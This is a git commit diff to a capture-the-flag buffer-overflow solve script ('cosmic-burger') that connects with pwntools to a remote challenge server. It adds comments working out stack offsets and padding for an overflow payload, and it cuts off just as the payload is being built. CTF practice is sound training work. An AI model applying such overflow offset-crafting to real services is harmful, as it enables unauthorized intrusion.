e90d577431f6fdb4d7fab799c67be9719e44fceb
gith-eng <135365698+gith-eng@users.noreply.github.com>
2026-04-19 19:21:30 +0200

    Comments
    Add comments and prepare payload for exploit

--- BOF/05-cosmic-burger/solve.py
+++ BOF/05-cosmic-burger/solve.py
@@ -7,8 +7,11 @@ p = remote("offsec.m0lecon.it", 13565)
 
 food = 0xbeef0000f00d
 
+#python3 -c "from pwn import *; print(cyclic(200))
+#32B (buf) + 8B (saved RBP)
 
-# Your exploit here
+#offset for sauce is 40, cheese is 44 (int size is 4B)
+#beef is just 2B so we need 2B of padding
 
 p.recvuntil(b"What's your order?")
 payload = flat(
